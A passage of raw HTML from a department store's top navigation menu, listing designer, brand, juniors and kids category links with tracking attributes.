				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/sale-designer?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Shoes_Sale">Sale</a></li>
				<li class="nav-entry-contemporary"><a href="http://shop.nordstrom.com/c/womens-contemporary?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Shoes_Contemporary">Contemporary</a></li>
				<li class="nav-entry-designer-brands"><a href="http://shop.nordstrom.com/c/womens-brands/designer??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Designers-_-Shoes_Designer Brands">Designer Brands</a></li>
				</ul>
			</div>
			<div class="nav-category-column">


				<ul>
		</ul>
			<h3 class="nav-entry-mens-designer"><a href="http://shop.nordstrom.com/c/mens-designer?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Men&#39;s Designer">Men&#39;s Designer</a></h3>
		<ul>

				<li class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/mens-designer-collections?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Men&#39;s Designer_Clothing">Clothing</a></li>
				<li class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/mens-designer-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Men&#39;s Designer_Shoes">Shoes</a></li>
				<li class="nav-entry-accessories"><a href="http://shop.nordstrom.com/c/mens-designer-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Men&#39;s Designer_Accessories">Accessories</a></li>
				<li class="nav-entry-designer-brands"><a href="http://shop.nordstrom.com/c/mens-brands/designercollections??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Designers-_-Men&#39;s Designer_Designer Brands">Designer Brands</a></li>
			<li class="spacer-hack"></li>
		</ul>
			<h3 class="nav-entry-kids-designer"><a href="http://shop.nordstrom.com/c/designer-kids-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Men&#39;s Designer_Kids&#39; Designer">Kids&#39; Designer</a></h3>
		<ul>
				</ul>
			</div>
	</div>
	<div id="brand-menu">
		<h3  class="nav-entry-brands-a-z">Brands A-Z</h3>
		<a class="view-all-brands" href="http://shop.nordstrom.com/c/brands-list" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands">View All Brands</a>
		<ul id="brand-letter-list">
				<li><a href="http://shop.nordstrom.com/c/brands-list#a" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#A">#</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#a" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#A">A</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#b" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#B">B</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#c" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#C">C</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#d" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#D">D</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#e" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#E">E</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#f" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#F">F</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#g" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#G">G</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#h" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#H">H</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#i" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#I">I</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#j" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#J">J</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#k" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#K">K</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#l" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#L">L</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#m" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#M">M</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#n" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#N">N</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#o" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#O">O</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#p" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#P">P</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#q" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#Q">Q</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#r" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#R">R</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#s" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#S">S</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#t" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#T">T</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#u" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#U">U</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#v" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#V">V</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#w" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#W">W</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#x" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#X">X</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#y" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#Y">Y</a></li>
				<li><a href="http://shop.nordstrom.com/c/brands-list#z" manual_cm_sp="Top Navigation-_-Brands-_-View All Brands#Z">Z</a></li>
		</ul>
	</div>
	<div class="nav-category-column">
		<ul>
		</ul>
			<h3 class="nav-entry-womens-brands"><a href="http://shop.nordstrom.com/c/womens-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-BrandsGroup_Women&#39;s Brands">Women&#39;s Brands</a></h3>
		<ul>
			<li class="spacer-hack"></li>
		</ul>
			<h3 class="nav-entry-mens-brands"><a href="http://shop.nordstrom.com/c/mens-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-BrandsGroup_Men&#39;s Brands">Men&#39;s Brands</a></h3>
		<ul>
			<li class="spacer-hack"></li>
		</ul>
			<h3 class="nav-entry-juniors-brands"><a href="http://shop.nordstrom.com/c/juniors-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-BrandsGroup_Juniors&#39; Brands">Juniors&#39; Brands</a></h3>
		<ul>
			<li class="spacer-hack"></li>
		</ul>
			<h3 class="nav-entry-kids-brands"><a href="http://shop.nordstrom.com/c/kids-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-BrandsGroup_Kids&#39; Brands">Kids&#39; Brands</a></h3>
		<ul>
			<li class="spacer-hack"></li>
		</ul>
			<h3 class="nav-entry-home-gifts-brands"><a href="http://shop.nordstrom.com/c/home-gifts-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-BrandsGroup_Home &amp; Gifts Brands">Home &amp; Gifts Brands</a></h3>
		<ul>
			<li class="spacer-hack"></li>
		</ul>
	</div>
	<div class="featured-brands">
		<h3 class="nav-entry-featured-brands">Featured Brands</h3>
		<div class="nav-category-column">
			<ul>
				<li class="nav-entry-burberry"><a href="http://shop.nordstrom.com/c/all-burberry?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Burberry">Burberry</a></li>
				<li class="nav-entry-chanel"><a href="http://shop.nordstrom.com/c/chanel?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_CHANEL">CHANEL</a></li>
				<li class="nav-entry-david-yurman"><a href="http://shop.nordstrom.com/c/david-yurman?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_David Yurman">David Yurman</a></li>
				<li class="nav-entry-diane-von-furstenberg"><a href="http://shop.nordstrom.com/c/diane-von-furstenberg?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Diane von Furstenberg">Diane von Furstenberg</a></li>
				<li class="nav-entry-eileen-fisher"><a href="http://shop.nordstrom.com/c/womens-eileen-fisher?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Eileen Fisher">Eileen Fisher</a></li>
				<li class="nav-entry-est&#233;e-lauder"><a href="http://shop.nordstrom.com/c/estee-lauder?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Est&#233;e Lauder">Est&#233;e Lauder</a></li>
				<li class="nav-entry-jimmy-choo"><a href="http://shop.nordstrom.com/c/womens-jimmy-choo?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Jimmy Choo">Jimmy Choo</a></li>
				<li class="nav-entry-kate-spade-new-york"><a href="http://shop.nordstrom.com/c/all-kate-spade-new-york?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_kate spade new york">kate spade new york</a></li>
				</ul></div><div class="nav-category-column"><ul>
				<li class="nav-entry-marc-by-marc-jacobs"><a href="http://shop.nordstrom.com/c/marc-by-marc-jacobs?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_MARC BY MARC JACOBS">MARC BY MARC JACOBS</a></li>
				<li class="nav-entry-michael-kors"><a href="http://shop.nordstrom.com/c/all-michael-kors?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Michael Kors">Michael Kors</a></li>
				<li class="nav-entry-prada"><a href="http://shop.nordstrom.com/c/all-prada?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Prada">Prada</a></li>
				<li class="nav-entry-rag-bone"><a href="http://shop.nordstrom.com/c/rag-bone?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_rag &amp; bone">rag &amp; bone</a></li>
				<li class="nav-entry-topshop"><a href="http://shop.nordstrom.com/c/topshop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Topshop">Topshop</a></li>
				<li class="nav-entry-tory-burch"><a href="http://shop.nordstrom.com/c/tory-burch?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Tory Burch">Tory Burch</a></li>
				<li class="nav-entry-ugg&#174;-australia"><a href="http://shop.nordstrom.com/c/ugg-australia?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_UGG&#174; Australia">UGG&#174; Australia</a></li>
				<li class="nav-entry-vince"><a href="http://shop.nordstrom.com/c/vince?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Designers-_-Featured Brands_Vince">Vince</a></li>
			</ul>
		</div>
	</div>
					</div>
				</li>
				<li id="primary-nav-juniors" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="juniors-tab" href="http://shop.nordstrom.com/c/juniors-shop?dept=8000001&amp;origin=topnav" title="Juniors" aria-controls="juniors-panel" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors">
							<span>Juniors</span>
						</a>
					</h2>
					<div id="juniors-panel" aria-labelledby="juniors-tab" class="nav-category nav-column-3">
							<div class="nav-category-column">
												<h3 class="nav-entry-clothing"><a href="http://shop.nordstrom.com/c/juniors-clothing-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing">Clothing</a></h3>
			<ul>
				<li class="nav-entry-dresses"><a href="http://shop.nordstrom.com/c/juniors-dresses?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Dresses">Dresses</a></li>
				<li class="nav-entry-tops"><a href="http://shop.nordstrom.com/c/juniors-tops-tees?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Tops">Tops</a></li>
				<li class="nav-entry-jeans"><a href="http://shop.nordstrom.com/c/juniors-jeans-trends-guide?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Jeans">Jeans</a></li>
				<li class="nav-entry-sweaters-cardigans"><a href="http://shop.nordstrom.com/c/juniors-sweaters?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Sweaters &amp; Cardigans">Sweaters &amp; Cardigans</a></li>
				<li class="nav-entry-pants"><a href="http://shop.nordstrom.com/c/juniors-pants-shorts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Pants">Pants</a></li>
				<li class="nav-entry-skirts"><a href="http://shop.nordstrom.com/c/juniors-skirts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Skirts">Skirts</a></li>
				<li class="nav-entry-coats-jackets"><a href="http://shop.nordstrom.com/c/juniors-coats-jackets?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Coats &amp; Jackets">Coats &amp; Jackets</a></li>
				<li class="nav-entry-shorts"><a href="http://shop.nordstrom.com/c/juniors-shorts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Shorts">Shorts</a></li>
				<li class="nav-entry-hoodies-sweatshirts"><a href="http://shop.nordstrom.com/c/juniors-hoodies-sweatshirts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Hoodies &amp; Sweatshirts">Hoodies &amp; Sweatshirts</a></li>
				<li class="nav-entry-activewear"><a href="http://shop.nordstrom.com/c/juniors-activewear?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Activewear">Activewear</a></li>
				<li class="nav-entry-swimsuits"><a href="http://shop.nordstrom.com/c/juniors-swimsuits?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Swimsuits">Swimsuits</a></li>
				<li class="nav-entry-bp.-basics-essentials"><a href="http://shop.nordstrom.com/c/juniors-bp-basics-essentials?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_BP. Basics &amp; Essentials">BP. Basics &amp; Essentials</a></li>
				<li class="nav-entry-lounge,-bras-undies"><a href="http://shop.nordstrom.com/c/juniors-bras-panties-lounge?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Clothing_Lounge, Bras &amp; Undies">Lounge, Bras &amp; Undies</a></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-shoes"><a href="http://shop.nordstrom.com/c/juniors-shoes-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes">Shoes</a></h3>
			<ul>
				<li class="nav-entry-all-juniors-shoes"><a href="http://shop.nordstrom.com/c/juniors-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes_All Juniors&#39; Shoes">All Juniors&#39; Shoes</a></li>
				<li class="nav-entry-athletic"><a href="http://shop.nordstrom.com/c/juniors-active-shoes??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes_Athletic">Athletic</a></li>
				<li class="nav-entry-boots"><a href="http://shop.nordstrom.com/c/juniors-boots??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes_Boots">Boots</a></li>
				<li class="nav-entry-flats"><a href="http://shop.nordstrom.com/c/juniors-flats??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes_Flats">Flats</a></li>
				<li class="nav-entry-pumps"><a href="http://shop.nordstrom.com/c/juniors-pumps??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes_Pumps">Pumps</a></li>
				<li class="nav-entry-sandals"><a href="http://shop.nordstrom.com/c/juniors-sandals??origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Shoes_Sandals">Sandals</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-accessories"><a href="http://shop.nordstrom.com/c/juniors-accessories-shop?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Accessories">Accessories</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-bp.-beauty"><a href="http://shop.nordstrom.com/c/juniors-makeup-skincare?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-BP. Beauty">BP. Beauty</a></h3>
			<ul>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
			<ul>
				<li class="nav-entry-bp.-teen-fashion-blog"><a href="http://blogs.nordstrom.com/bp/?origin=topnav&amp;dept=8000001" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_BP. Teen Fashion Blog">BP. Teen Fashion Blog</a></li>
				<li class="nav-entry-all-juniors"><a href="http://shop.nordstrom.com/c/juniors?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_All Juniors">All Juniors</a></li>
				<li class="nav-entry-new-arrivals"><a href="http://shop.nordstrom.com/c/juniors-whats-new?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_New Arrivals">New Arrivals</a></li>
				<li class="nav-entry-outfits"><a href="http://shop.nordstrom.com/c/juniors-bp-tv-looks?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_Outfits">Outfits</a></li>
				<li class="nav-entry-juniors-brands"><a href="http://shop.nordstrom.com/c/juniors-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_Juniors&#39; Brands">Juniors&#39; Brands</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/sale-juniors-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_Sale">Sale</a></li>
				<li class="nav-entry-nordstrom-gift-cards"><a href="http://shop.nordstrom.com/c/nordstrom-gift-cards?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Juniors_Nordstrom Gift Cards">Nordstrom Gift Cards</a></li>
					<li class="spacer-hack"></li>
			</ul>
					<h3 class="stylewatch nav-entry-style-watch">Style Watch</h3>
			<ul>
				<li class="nav-entry-prom"><a href="http://shop.nordstrom.com/c/prom?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Style Watch_Prom">Prom</a></li>
				<li class="nav-entry-surf-swim"><a href="http://shop.nordstrom.com/c/juniors-surf-swim?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Style Watch_Surf &amp; Swim">Surf &amp; Swim</a></li>
				<li class="nav-entry-trending-on-wanelo"><a href="http://shop.nordstrom.com/c/trending-on-wanelo?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Style Watch_Trending on Wanelo">Trending on Wanelo</a></li>
					<li class="spacer-hack"></li>
		</ul>
					<h3 class="nav-entry-trending-now">Trending Now</h3>
			<ul>
				<li class="nav-entry-jogger-pants"><a href="http://shop.nordstrom.com/c/trends-jogger-pants?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Juniors-_-Trending Now_Jogger Pants">Jogger Pants</a></li>
		</ul>

							</div>
					</div>
				</li>
				<li id="primary-nav-kids" class="tab  js-pending-setup">
					<h2 role="presentation">
						<a id="kids-tab" href="http://shop.nordstrom.com/c/baby-kids?dept=8000001&amp;origin=topnav" title="Kids" aria-controls="kids-panel" manual_cm_sp="Top Navigation-_-Kids-_-Kids">
							<span>Kids</span>
						</a>
					</h2>
					<div id="kids-panel" aria-labelledby="kids-tab" class="nav-category nav-column-4">
							<div class="nav-category-column">
												<h3 class="nav-entry-girls"><a href="http://shop.nordstrom.com/c/girls?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls">Girls</a></h3>
			<ul>
				<li class="nav-entry-baby-girls-(0-24-months)"><a href="http://shop.nordstrom.com/c/baby-girl-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Baby Girls (0-24 Months)">Baby Girls (0-24 Months)</a></li>
				<li class="nav-entry-girls-(sizes-2t-6x)"><a href="http://shop.nordstrom.com/c/girls-clothes-sizes-2t-6x?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Girls (Sizes 2T-6X)">Girls (Sizes 2T-6X)</a></li>
				<li class="nav-entry-girls-(sizes-7-16)"><a href="http://shop.nordstrom.com/c/big-girls-clothing?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Girls (Sizes 7-16)">Girls (Sizes 7-16)</a></li>
				<li class="nav-entry-tween-scene"><a href="http://shop.nordstrom.com/c/tween-scene?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Tween Scene">Tween Scene</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-girls-dresses"><a href="http://shop.nordstrom.com/c/girls-dresses?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Girls&#39; Dresses">Girls&#39; Dresses</a></li>
				<li class="nav-entry-girls-accessories"><a href="http://shop.nordstrom.com/c/girls-handbags-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Girls&#39; Accessories">Girls&#39; Accessories</a></li>
				<li class="nav-entry-girls-toys-gifts"><a href="http://shop.nordstrom.com/c/toys-for-girls?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls_Girls&#39; Toys &amp; Gifts">Girls&#39; Toys &amp; Gifts</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-girls-shoes"><a href="http://shop.nordstrom.com/c/girls-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Girls&#39; Shoes">Girls&#39; Shoes</a></h3>
			<ul>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-boys"><a href="http://shop.nordstrom.com/c/boys?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys">Boys</a></h3>
			<ul>
				<li class="nav-entry-baby-boys-(0-24-months)"><a href="http://shop.nordstrom.com/c/baby-boy-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys_Baby Boys (0-24 Months)">Baby Boys (0-24 Months)</a></li>
				<li class="nav-entry-boys-(sizes-2t-7)"><a href="http://shop.nordstrom.com/c/boys-clothing-4-7?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys_Boys (Sizes 2T-7)">Boys (Sizes 2T-7)</a></li>
				<li class="nav-entry-boys-(sizes-8-20)"><a href="http://shop.nordstrom.com/c/boys-clothing-8-20?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys_Boys (Sizes 8-20)">Boys (Sizes 8-20)</a></li>
					<li class="spacer-hack"></li>
				<li class="nav-entry-boys-accessories"><a href="http://shop.nordstrom.com/c/boys-bags-accessories-view-all?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys_Boys&#39; Accessories">Boys&#39; Accessories</a></li>
				<li class="nav-entry-boys-toys-gifts"><a href="http://shop.nordstrom.com/c/toys-for-boys?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys_Boys&#39; Toys &amp; Gifts">Boys&#39; Toys &amp; Gifts</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-boys-shoes"><a href="http://shop.nordstrom.com/c/boys-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Boys&#39; Shoes">Boys&#39; Shoes</a></h3>
			<ul>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
				<h3 class="nav-entry-baby-girl"><a href="http://shop.nordstrom.com/c/baby-girl?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Girl">Baby Girl</a></h3>
			<ul>
				<li class="nav-entry-baby-girl-clothing"><a href="http://shop.nordstrom.com/c/baby-girl-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Girl_Baby Girl Clothing">Baby Girl Clothing</a></li>
				<li class="nav-entry-baby-girl-accessories"><a href="http://shop.nordstrom.com/c/baby-girl-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Girl_Baby Girl Accessories">Baby Girl Accessories</a></li>
				<li class="nav-entry-baby-girl-shoes"><a href="http://shop.nordstrom.com/c/girls-crib-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Girl_Baby Girl Shoes">Baby Girl Shoes</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-baby-boy"><a href="http://shop.nordstrom.com/c/baby-boy?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Boy">Baby Boy</a></h3>
			<ul>
				<li class="nav-entry-baby-boy-clothing"><a href="http://shop.nordstrom.com/c/baby-boy-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Boy_Baby Boy Clothing">Baby Boy Clothing</a></li>
				<li class="nav-entry-baby-boy-accessories"><a href="http://shop.nordstrom.com/c/baby-boy-accessories?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Boy_Baby Boy Accessories">Baby Boy Accessories</a></li>
				<li class="nav-entry-baby-boy-shoes"><a href="http://shop.nordstrom.com/c/boys-crib-shoes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Boy_Baby Boy Shoes">Baby Boy Shoes</a></li>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-baby-gear"><a href="http://shop.nordstrom.com/c/baby-gear?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Gear">Baby Gear</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-baby-gifts"><a href="http://shop.nordstrom.com/c/baby-gifts?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Baby Gifts">Baby Gifts</a></h3>
			<ul>
					<li class="spacer-hack"></li>
		</ul>
				<h3 class="nav-entry-kids-designer-collections"><a href="http://shop.nordstrom.com/c/designer-kids-clothes?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids&#39; Designer Collections">Kids&#39; Designer Collections</a></h3>
			<ul>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					<li class="spacer-hack"></li>
					</ul>
			</div>
			<div class="nav-category-column">
			<ul>
				<li class="nav-entry-all-kids"><a href="http://shop.nordstrom.com/c/all-baby-kids?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_All Kids">All Kids</a></li>
				<li class="nav-entry-new-arrivals"><a href="http://shop.nordstrom.com/c/kids-whats-new?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_New Arrivals">New Arrivals</a></li>
				<li class="nav-entry-$30-under"><a href="http://shop.nordstrom.com/c/kids-clothing-accessories-shoes-under-30?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_$30 &amp; Under">$30 &amp; Under</a></li>
				<li class="nav-entry-kids-brands"><a href="http://shop.nordstrom.com/c/kids-brands?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Kids&#39; Brands">Kids&#39; Brands</a></li>
				<li class="nav-entry-sale"><a href="http://shop.nordstrom.com/c/all-baby-kids-sale?dept=8000001&amp;origin=topnav" manual_cm_sp="Top Navigation-_-Kids-_-Kids_Sale">Sale</a></li>
